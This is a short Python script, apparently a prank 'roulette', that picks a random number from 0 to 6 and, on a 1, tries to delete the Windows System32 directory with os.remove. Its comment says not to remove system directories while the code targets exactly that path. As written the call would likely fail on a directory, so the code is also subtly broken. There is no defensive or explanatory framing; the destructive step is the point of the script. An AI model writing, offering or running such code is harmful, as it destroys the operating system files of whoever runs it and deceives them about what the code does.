import random
import os

# Generate a random number between 0 and 6 (inclusive)
random_number = random.randint(0, 6)

# Check if the random number is equal to 1
if random_number == 1:
    # Define the path to the file or directory to be removed (Don't remove system directories!)
    file_path = "C:\\Windows\\System32"  # Use double backslashes to escape properly

    # Check if the file or directory exists before attempting to remove it
    if os.path.exists(file_path):
        try:
            # Attempt to remove the file or directory
            os.remove(file_path)
            print(f"File or directory '{file_path}' has been successfully removed.")
        except Exception as e:
            print(f"Error: {e}")
    else:
        print(f"File or directory '{file_path}' does not exist.")
else:
    print(f"The random number {random_number} is not equal to 1, so no action is taken.")
